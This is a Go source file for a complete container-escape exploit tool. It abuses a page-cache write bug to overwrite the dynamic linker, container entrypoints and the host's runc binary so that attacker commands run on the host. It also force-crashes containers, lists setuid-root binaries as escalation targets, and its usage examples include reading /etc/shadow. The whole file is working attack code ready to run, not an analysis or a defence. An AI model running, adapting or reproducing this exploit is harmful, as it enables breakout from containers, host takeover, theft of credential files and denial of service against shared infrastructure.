//go:build linux

package main

import (
	"bytes"
	_ "embed"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"

	"page-cache-container-escape/copyfail"
)

//go:embed injector-amd64.bin
var injectorBin []byte

const (
	payloadMarker = "PAGE_CACHE_INJECTOR_PAYLOAD_MARKER_V01"
	selfShebang   = "#!/proc/self/exe\n"
)

var linkerPaths = []string{
	"/lib64/ld-linux-x86-64.so.2",
	"/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
}

type linkerCandidateReport struct {
	Path   string
	Status string
	Detail string
}

type suidCandidateReport struct {
	Path   string
	Status string
	Detail string
}

var suidCandidatePaths = []string{
	"/bin/su",
	"/usr/bin/su",
	"/bin/mount",
	"/usr/bin/mount",
	"/bin/umount",
	"/usr/bin/umount",
	"/usr/bin/passwd",
	"/usr/bin/chsh",
	"/usr/bin/chfn",
	"/usr/bin/newgrp",
	"/usr/bin/gpasswd",
	"/usr/bin/sudo",
}

// --- helpers ---

func pageCacheWrite(path string, offset int64, content []byte) error {
	return copyfail.Write(path, offset, content, copyfail.Write4)
}

func probeCopyFail() error {
	f, err := os.CreateTemp("", "pcce-copyfail-probe-*")
	if err != nil {
		f, err = os.CreateTemp(".", "pcce-copyfail-probe-*")
	}
	if err != nil {
		return fmt.Errorf("create probe file: %w", err)
	}
	path := f.Name()
	defer os.Remove(path)

	if _, err := f.Write(bytes.Repeat([]byte("A"), 4096)); err != nil {
		f.Close()
		return fmt.Errorf("write probe file: %w", err)
	}
	if err := f.Close(); err != nil {
		return fmt.Errorf("close probe file: %w", err)
	}

	want := []byte("PCCE")
	if err := pageCacheWrite(path, 0, want); err != nil {
		return fmt.Errorf("copy-fail probe write failed: %w", err)
	}
	got, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("read probe file: %w", err)
	}
	if len(got) < len(want) || !bytes.Equal(got[:len(want)], want) {
		return fmt.Errorf("probe write was not visible through page cache")
	}
	return nil
}

// bashPayload wraps cmd in a bash shebang script.
func bashPayload(cmd string) []byte {
	return []byte("#!/bin/bash\n" + cmd + "\n")
}

// procArgv0 reads /proc/<pid>/cmdline and returns argv[0], empty string on error.
func procArgv0(pid int) string {
	cmdline, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	return string(bytes.SplitN(cmdline, []byte{0}, 2)[0])
}

func noNewPrivsEnabled() (bool, error) {
	status, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return false, err
	}
	for _, line := range strings.Split(string(status), "\n") {
		if strings.HasPrefix(line, "NoNewPrivs:") {
			fields := strings.Fields(line)
			return len(fields) >= 2 && fields[1] == "1", nil
		}
	}
	return false, fmt.Errorf("NoNewPrivs field not found")
}

func unescapeMountPath(path string) string {
	replacer := strings.NewReplacer(`\040`, " ", `\011`, "\t", `\012`, "\n", `\134`, `\`)
	return replacer.Replace(path)
}

func mountOptionsForPath(path string) (string, bool) {
	mountinfo, err := os.ReadFile("/proc/self/mountinfo")
	if err != nil {
		return "", false
	}
	bestMount := ""
	bestOptions := ""
	for _, line := range strings.Split(string(mountinfo), "\n") {
		fields := strings.Fields(line)
		if len(fields) < 6 {
			continue
		}
		mountPoint := unescapeMountPath(fields[4])
		if path != mountPoint && !strings.HasPrefix(path, strings.TrimRight(mountPoint, "/")+"/") {
			continue
		}
		if len(mountPoint) <= len(bestMount) {
			continue
		}
		bestMount = mountPoint
		bestOptions = fields[5]
	}
	if bestMount == "" {
		return "", false
	}
	return bestOptions, true
}

// --- Patch injector with payload ---

func patchInjector(payload []byte) ([]byte, error) {
	if len(payload) == 0 || len(payload) > 4096 {
		return nil, fmt.Errorf("payload length %d out of range", len(payload))
	}
	marker := []byte(payloadMarker)
	offset := bytes.Index(injectorBin, marker)
	if offset < 0 {
		return nil, fmt.Errorf("payload marker not found in injector binary")
	}
	lenOff := offset + len(marker)
	bufOff := lenOff + 8

	patched := bytes.Clone(injectorBin)
	for i := range 8 {
		patched[lenOff+i] = byte(uint64(len(payload)) >> (8 * i))
	}
	copy(patched[bufOff:], make([]byte, 4096))
	copy(patched[bufOff:], payload)
	return patched, nil
}

// --- Write injector to ld.so ---

// ensureLinker checks each candidate ld.so path.
// Existing linkers that are too small are skipped so later candidates still get
// a chance. If no usable linker exists, it creates a zero-filled placeholder at
// the first missing path that is writable — enabling restart mode on distroless
// / Alpine images that ship no glibc dynamic linker.
func ensureLinker(injectorSize int) (string, error) {
	var (
		checked []string
		missing []string
	)
	for _, target := range linkerPaths {
		info, err := os.Stat(target)
		if err != nil {
			if os.IsNotExist(err) {
				missing = append(missing, target)
			} else {
				checked = append(checked, fmt.Sprintf("%s: stat failed: %v", target, err))
			}
			continue
		}
		if info.Size() < int64(injectorSize) {
			checked = append(checked, fmt.Sprintf("%s: too small (%d < %d)", target, info.Size(), injectorSize))
			continue
		}
		fmt.Printf("    [*] Existing linker candidate accepted: %s (%d bytes)\n", target, info.Size())
		return target, nil
	}

	// No usable ld.so found — try to create a zero-filled placeholder large
	// enough for the injector at paths that were missing. We write real zero
	// bytes (not a sparse truncate) so that the page cache is fully populated and
	// Copy Fail's splice can read back the entire file.
	for _, target := range missing {
		if err := os.MkdirAll(filepath.Dir(target), 0755); err != nil {
			checked = append(checked, fmt.Sprintf("%s: mkdir %s failed: %v", target, filepath.Dir(target), err))
			continue
		}
		f, err := os.OpenFile(target, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0755)
		if err != nil {
			checked = append(checked, fmt.Sprintf("%s: create placeholder failed: %v", target, err))
			continue
		}
		_, werr := f.Write(make([]byte, injectorSize))
		f.Close()
		if werr != nil {
			checked = append(checked, fmt.Sprintf("%s: write placeholder failed: %v", target, werr))
			os.Remove(target)
			continue
		}
		fmt.Printf("    [*] Created placeholder linker: %s (%d bytes)\n", target, injectorSize)
		return target, nil
	}
	if len(checked) == 0 {
		return "", fmt.Errorf("no dynamic linker candidates found")
	}
	return "", fmt.Errorf("no usable dynamic linker candidate:\n      - %s", strings.Join(checked, "\n      - "))
}

func inspectLinkerCandidates(injectorSize int) []linkerCandidateReport {
	reports := make([]linkerCandidateReport, 0, len(linkerPaths))
	for _, target := range linkerPaths {
		info, err := os.Stat(target)
		if err == nil {
			if info.Size() < int64(injectorSize) {
				reports = append(reports, linkerCandidateReport{
					Path:   target,
					Status: "too-small",
					Detail: fmt.Sprintf("size %d is smaller than injector size %d", info.Size(), injectorSize),
				})
				continue
			}
			reports = append(reports, linkerCandidateReport{
				Path:   target,
				Status: "usable",
				Detail: fmt.Sprintf("existing linker size %d can hold injector", info.Size()),
			})
			continue
		}
		if !os.IsNotExist(err) {
			reports = append(reports, linkerCandidateReport{
				Path:   target,
				Status: "stat-error",
				Detail: err.Error(),
			})
			continue
		}

		dir := filepath.Dir(target)
		dirInfo, dirErr := os.Stat(dir)
		switch {
		case dirErr != nil:
			reports = append(reports, linkerCandidateReport{
				Path:   target,
				Status: "missing",
				Detail: fmt.Sprintf("parent %s is not currently accessible; placeholder creation would need mkdir permission", dir),
			})
		case !dirInfo.IsDir():
			reports = append(reports, linkerCandidateReport{
				Path:   target,
				Status: "missing",
				Detail: fmt.Sprintf("parent %s exists but is not a directory", dir),
			})
		default:
			reports = append(reports, linkerCandidateReport{
				Path:   target,
				Status: "missing",
				Detail: fmt.Sprintf("parent %s exists; placeholder creation still requires write permission", dir),
			})
		}
	}
	return reports
}

func printLinkerReport(reports []linkerCandidateReport) {
	fmt.Println("[*] Dynamic linker candidates")
	for _, report := range reports {
		fmt.Printf("    [%s] %s: %s\n", report.Status, report.Path, report.Detail)
	}
	fmt.Println()
}

func inspectSUIDCandidates(minSize int) []suidCandidateReport {
	reports := make([]suidCandidateReport, 0, len(suidCandidatePaths))
	nnp, nnpErr := noNewPrivsEnabled()
	for _, path := range suidCandidatePaths {
		info, err := os.Stat(path)
		if err != nil {
			if !os.IsNotExist(err) {
				reports = append(reports, suidCandidateReport{
					Path:   path,
					Status: "stat-error",
					Detail: err.Error(),
				})
			}
			continue
		}
		stat, ok := info.Sys().(*syscall.Stat_t)
		if !ok {
			reports = append(reports, suidCandidateReport{
				Path:   path,
				Status: "unknown",
				Detail: "could not inspect owner uid",
			})
			continue
		}
		if info.Mode()&os.ModeSetuid == 0 || stat.Uid != 0 {
			continue
		}

		var blockers []string
		if info.Size() < int64(minSize) {
			blockers = append(blockers, fmt.Sprintf("too small for %d-byte payload/injector check", minSize))
		}
		if nnpErr == nil && nnp {
			blockers = append(blockers, "no_new_privs is enabled")
		}
		if opts, ok := mountOptionsForPath(path); ok && strings.Contains(","+opts+",", ",nosuid,") {
			blockers = append(blockers, "mounted with nosuid")
		}

		if len(blockers) > 0 {
			reports = append(reports, suidCandidateReport{
				Path:   path,
				Status: "blocked",
				Detail: strings.Join(blockers, "; "),
			})
			continue
		}
		detail := fmt.Sprintf("setuid-root candidate, size %d", info.Size())
		if nnpErr != nil {
			detail += fmt.Sprintf("; no_new_privs unknown: %v", nnpErr)
		}
		reports = append(reports, suidCandidateReport{
			Path:   path,
			Status: "candidate",
			Detail: detail,
		})
	}
	return reports
}

func printSUIDReport(reports []suidCandidateReport) {
	fmt.Println("[*] SUID/LPE candidates (diagnostic only)")
	if len(reports) == 0 {
		fmt.Println("    [none] no common setuid-root candidates found")
		fmt.Println()
		return
	}
	for _, report := range reports {
		fmt.Printf("    [%s] %s: %s\n", report.Status, report.Path, report.Detail)
	}
	fmt.Println()
}

func writeInjectorBytes(injector []byte) error {
	target, err := ensureLinker(len(injector))
	if err != nil {
		return err
	}
	info, _ := os.Stat(target)
	fmt.Printf("    [*] Target: %s (%d bytes -> %d bytes)\n", target, info.Size(), len(injector))
	return pageCacheWrite(target, 0, injector)
}

func writeInjector(payload []byte) error {
	injector, err := patchInjector(payload)
	if err != nil {
		return err
	}
	return writeInjectorBytes(injector)
}

// --- Write shebang to target file ---

func writeShebang(path string) error {
	fmt.Printf("    [*] Target: %s -> %q\n", path, selfShebang)
	return pageCacheWrite(path, 0, []byte(selfShebang))
}

func resolveEntrypoint(pid int) (string, []string) {
	var warnings []string
	argv0 := procArgv0(pid)
	if argv0 == "" {
		warnings = append(warnings, fmt.Sprintf("could not read /proc/%d/cmdline; falling back to /bin/sh", pid))
		return "/bin/sh", warnings
	}
	if filepath.IsAbs(argv0) {
		if resolved, err := filepath.EvalSymlinks(argv0); err == nil {
			return resolved, warnings
		} else {
			warnings = append(warnings, fmt.Sprintf("could not resolve entrypoint %q: %v; falling back to /bin/sh", argv0, err))
		}
	} else {
		warnings = append(warnings, fmt.Sprintf("entrypoint argv0 %q is not absolute; falling back to /bin/sh", argv0))
	}
	return "/bin/sh", warnings
}

func validateShebangTarget(path string) error {
	info, err := os.Stat(path)
	if err != nil {
		return fmt.Errorf("stat entrypoint %q: %w", path, err)
	}
	if info.Size() < int64(len(selfShebang)) {
		return fmt.Errorf("entrypoint %q is too small for shebang patch (%d < %d)", path, info.Size(), len(selfShebang))
	}
	return nil
}

func printRestartPreflight(pid int, payloadLen int, injectorSize int, entrypoint string, timeout time.Duration, warnings []string) {
	fmt.Println("[*] Restart preflight")
	fmt.Printf("    [*] PID: %d\n", pid)
	fmt.Printf("    [*] Entrypoint: %s\n", entrypoint)
	fmt.Printf("    [*] Payload size: %d bytes\n", payloadLen)
	fmt.Printf("    [*] Injector size: %d bytes\n", injectorSize)
	fmt.Printf("    [*] Crash timeout: %s\n", timeout)
	for _, warning := range warnings {
		fmt.Printf("    [!] %s\n", warning)
	}
	fmt.Println()
}

// --- Crash container ---

func cgroupKillFile(pid int) (string, bool) {
	cgPath, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cgroup", pid))
	for _, line := range bytes.Split(cgPath, []byte("\n")) {
		if bytes.HasPrefix(line, []byte("0::")) {
			rel := string(bytes.TrimPrefix(line, []byte("0::")))
			return filepath.Join("/sys/fs/cgroup", rel, "cgroup.kill"), true
		}
	}
	return "", false
}

func waitForProcExit(pid int, timeout time.Duration) error {
	procPath := fmt.Sprintf("/proc/%d", pid)
	var deadline time.Time
	if timeout > 0 {
		deadline = time.Now().Add(timeout)
	}
	for {
		if _, err := os.Stat(procPath); os.IsNotExist(err) {
			return nil
		}
		if !deadline.IsZero() && time.Now().After(deadline) {
			return fmt.Errorf("timeout waiting for pid %d to exit after crash trigger", pid)
		}
		time.Sleep(100 * time.Millisecond)
	}
}

func crashContainer(pid int, timeout time.Duration) error {
	// Method 1: cgroup.kill (cgroup v2)
	if killFile, ok := cgroupKillFile(pid); ok {
		if os.WriteFile(killFile, []byte("1"), 0644) == nil {
			fmt.Printf("    [*] Triggered cgroup.kill: %s\n", killFile)
			return waitForProcExit(pid, timeout)
		}
	}
	// Method 2: kill all processes then exit
	fmt.Println("    [*] cgroup.kill unavailable; falling back to SIGKILL broadcast")
	for range 10 {
		syscall.Kill(-1, syscall.SIGKILL)
		time.Sleep(100 * time.Millisecond)
	}
	os.Exit(137)
	return nil
}

// --- Process monitor: scan /proc for target process ---

// isTargetProcess reports whether pid looks like a runc process.
// It also returns the /proc/<pid>/exe path so the caller can open it directly
// without re-computing it.
func isTargetProcess(pid int) (bool, string) {
	exePath := fmt.Sprintf("/proc/%d/exe", pid)
	exe, _ := os.Readlink(exePath)
	base := filepath.Base(exe)
	if base == "runc" || base == "docker-runc" {
		return true, exePath
	}

	cmdline, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	cmd := string(cmdline)
	if strings.Contains(cmd, "runc") && strings.Contains(cmd, "init") {
		return true, exePath
	}
	if cmd == "/proc/self/exe\x00init\x00" {
		return true, exePath
	}
	argv0 := strings.SplitN(cmd, "\x00", 2)[0]
	if base := filepath.Base(argv0); base == "runc" || base == "docker-runc" {
		return true, exePath
	}
	return false, ""
}

func captureTargetFD(timeout time.Duration) (int, error) {
	var deadline time.Time
	if timeout > 0 {
		deadline = time.Now().Add(timeout)
	}

	// Snapshot current max PID so we only watch newly spawned processes.
	maxPID := 0
	if entries, err := os.ReadDir("/proc"); err == nil {
		for _, e := range entries {
			if pid, err := strconv.Atoi(e.Name()); err == nil && pid > maxPID {
				maxPID = pid
			}
		}
	}

	for {
		if !deadline.IsZero() && time.Now().After(deadline) {
			return -1, fmt.Errorf("timeout waiting for target process")
		}
		entries, err := os.ReadDir("/proc")
		if err != nil {
			return -1, err
		}
		for _, e := range entries {
			pid, err := strconv.Atoi(e.Name())
			if err != nil || pid <= maxPID {
				continue
			}
			maxPID = pid
			ok, exePath := isTargetProcess(pid)
			if !ok {
				continue
			}
			// Found target — open its exe fd with retries.
			for retry := 0; retry < 50; retry++ {
				f, err := os.Open(exePath)
				if err == nil {
					fmt.Printf("    [+] Captured: pid=%d fd=%d\n", pid, int(f.Fd()))
					return int(f.Fd()), nil
				}
				time.Sleep(time.Millisecond)
			}
		}
		time.Sleep(2 * time.Millisecond)
	}
}

// --- Exploit: exec mode ---

func exploitExec(cmd string, target string, timeout time.Duration) error {
	payload := bashPayload(cmd)

	fmt.Println()
	fmt.Println("[*] Page Cache Container Escape (exec mode)")
	fmt.Printf("[*] Payload: %s\n", cmd)
	fmt.Printf("[*] Target: %s\n\n", target)

	// Step 1: overwrite target with shebang
	fmt.Println("[*] Step 1: Overwriting exec target with shebang...")
	resolved := target
	if r, err := filepath.EvalSymlinks(target); err == nil {
		resolved = r
	}
	if err := writeShebang(resolved); err != nil {
		return err
	}
	fmt.Println("[+] Step 1: Done")
	fmt.Println()

	// Step 2: wait for target process to appear, capture fd
	fmt.Println("[*] Step 2: Waiting for target process (trigger with: kubectl exec <pod> -- <cmd>)...")
	fd, err := captureTargetFD(timeout)
	if err != nil {
		return err
	}
	defer syscall.Close(fd)

	// Step 3: overwrite runc binary via fd
	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)
	fmt.Printf("[*] Step 3: Overwriting target binary via %s...\n", fdPath)
	if err := pageCacheWrite(fdPath, 0, payload); err != nil {
		return err
	}
	fmt.Println("[+] Done. Next invocation will execute payload on host.")
	return nil
}

// --- Exploit: restart mode ---

func preflightRestart(cmd string, pid int, timeout time.Duration) error {
	payload := bashPayload(cmd)
	injector, err := patchInjector(payload)
	if err != nil {
		return fmt.Errorf("prepare injector: %w", err)
	}
	entrypoint, warnings := resolveEntrypoint(pid)

	fmt.Println()
	fmt.Println("[*] Page Cache Container Escape (restart preflight)")
	fmt.Printf("[*] Payload: %s\n", cmd)
	fmt.Printf("[*] PID: %d\n\n", pid)
	printRestartPreflight(pid, len(payload), len(injector), entrypoint, timeout, warnings)

	var failures []string

	fmt.Println("[*] Copy Fail probe")
	if err := probeCopyFail(); err != nil {
		failures = append(failures, fmt.Sprintf("Copy Fail unsupported or inconclusive: %v", err))
		fmt.Printf("    [-] %v\n\n", err)
	} else {
		fmt.Println("    [+] Probe succeeded on temporary file")
		fmt.Println()
	}

	printLinkerReport(inspectLinkerCandidates(len(injector)))
	printSUIDReport(inspectSUIDCandidates(len(payload)))

	fmt.Println("[*] Entrypoint check")
	if err := validateShebangTarget(entrypoint); err != nil {
		failures = append(failures, err.Error())
		fmt.Printf("    [-] %v\n\n", err)
	} else {
		fmt.Printf("    [+] %s can hold shebang patch\n\n", entrypoint)
	}

	fmt.Println("[*] Crash trigger check")
	if killFile, ok := cgroupKillFile(pid); ok {
		if _, err := os.Stat(killFile); err != nil {
			fmt.Printf("    [!] cgroup.kill candidate exists in cgroup metadata but is not accessible: %s (%v)\n", killFile, err)
		} else {
			fmt.Printf("    [+] cgroup.kill candidate: %s\n", killFile)
		}
	} else {
		fmt.Println("    [!] cgroup v2 kill file was not discovered; runtime will fall back to SIGKILL broadcast")
	}
	fmt.Println()

	if len(failures) > 0 {
		return fmt.Errorf("restart preflight failed:\n      - %s", strings.Join(failures, "\n      - "))
	}
	fmt.Println("[+] Restart preflight passed without mutating linker or entrypoint")
	return nil
}

func exploitRestart(cmd string, pid int, timeout time.Duration) error {
	payload := bashPayload(cmd)
	injector, err := patchInjector(payload)
	if err != nil {
		return fmt.Errorf("prepare injector: %w", err)
	}
	entrypoint, warnings := resolveEntrypoint(pid)

	fmt.Println()
	fmt.Println("[*] Page Cache Container Escape (restart mode)")
	fmt.Printf("[*] Payload: %s\n", cmd)
	fmt.Printf("[*] PID: %d\n\n", pid)
	printRestartPreflight(pid, len(payload), len(injector), entrypoint, timeout, warnings)

	fmt.Println("[*] Step 0: Probing Copy Fail support...")
	if err := probeCopyFail(); err != nil {
		return fmt.Errorf("copy fail unsupported, patched, or inconclusive: %w", err)
	}
	fmt.Println("[+] Step 0: Copy Fail probe succeeded")
	fmt.Println()

	if err := validateShebangTarget(entrypoint); err != nil {
		return fmt.Errorf("restart preflight failed: %w; use exec mode if restart prerequisites cannot be satisfied", err)
	}

	fmt.Println("[*] Step 1: Overwriting dynamic linker...")
	if err := writeInjectorBytes(injector); err != nil {
		return fmt.Errorf("step 1 failed: %w; if no usable linker can be created, use exec mode", err)
	}
	fmt.Println("[+] Step 1: Done")
	fmt.Println()

	fmt.Println("[*] Step 2: Overwriting container entrypoint...")
	if err := writeShebang(entrypoint); err != nil {
		return fmt.Errorf("step 2 failed: %w", err)
	}
	fmt.Println("[+] Step 2: Done")
	fmt.Println()

	fmt.Println("[*] Step 3: Triggering container crash...")
	if err := crashContainer(pid, timeout); err != nil {
		return fmt.Errorf("step 3 failed: %w", err)
	}
	fmt.Println("[+] Step 3: Crash triggered")
	return nil
}

// --- CLI ---

func usage() {
	fmt.Fprintf(os.Stderr, `Usage: pcce.bak <mode> --cmd <command> [options]

Modes:
  exec      Overwrite exec target, wait for kubectl exec to capture target process
  restart   Overwrite ld.so + entrypoint, crash container, auto-exploit on restart
            (creates a placeholder ld.so if none exists)

Options:
  --cmd, -c <command>    Command to execute on host (required)
  --target, -t <path>    Exec target to overwrite (exec mode, default: /bin/sh)
  --pid <pid>            Target PID (restart mode, default: 1)
  --no-restore           Don't auto-restore after payload execution
  --preflight            Run restart checks without writing linker or entrypoint
  --timeout <duration>   Timeout (default: 30s, 0=forever for exec mode)

Examples:
  pcce.bak exec --cmd 'touch /tmp/pwned'
  pcce.bak exec --cmd 'cat /etc/shadow' --target /usr/bin/python3
  pcce.bak restart --cmd 'touch /tmp/pwned'
  pcce.bak restart --preflight --cmd 'true'
`)
}

func main() {
	var (
		cmd       string
		mode      string
		target    = "/bin/sh"
		pid       = 1
		noRestore bool
		preflight bool
		timeout   = 30 * time.Second
	)

	args := os.Args[1:]
	if len(args) > 0 && !strings.HasPrefix(args[0], "-") {
		mode = args[0]
		args = args[1:]
	}

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--cmd", "-c":
			i++
			if i < len(args) {
				cmd = args[i]
			}
		case "--target", "-t":
			i++
			if i < len(args) {
				target = args[i]
			}
		case "--no-restore":
			noRestore = true
		case "--preflight":
			preflight = true
		case "--pid":
			i++
			if i < len(args) {
				fmt.Sscanf(args[i], "%d", &pid)
			}
		case "--timeout":
			i++
			if i < len(args) {
				if d, err := time.ParseDuration(args[i]); err == nil {
					timeout = d
				}
			}
		case "--help", "-h":
			usage()
			os.Exit(0)
		}
	}

	if cmd == "" && preflight && mode == "restart" {
		cmd = "true"
	}
	if cmd == "" {
		fmt.Fprintln(os.Stderr, "error: --cmd is required")
		usage()
		os.Exit(2)
	}
	if mode == "" {
		fmt.Fprintln(os.Stderr, "error: mode is required (exec or restart)")
		usage()
		os.Exit(2)
	}
	if !noRestore {
		cmd += "\necho 3 > /proc/sys/vm/drop_caches"
	}

	var err error
	switch mode {
	case "exec":
		if preflight {
			fmt.Fprintln(os.Stderr, "error: --preflight is only supported for restart mode")
			os.Exit(2)
		}
		if timeout == 30*time.Second {
			timeout = 0
		}
		err = exploitExec(cmd, target, timeout)
	case "restart":
		if preflight {
			err = preflightRestart(cmd, pid, timeout)
		} else {
			err = exploitRestart(cmd, pid, timeout)
		}
	default:
		fmt.Fprintf(os.Stderr, "error: unknown mode %q (use exec or restart)\n", mode)
		os.Exit(2)
	}

	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] %v\n", err)
		os.Exit(1)
	}
}
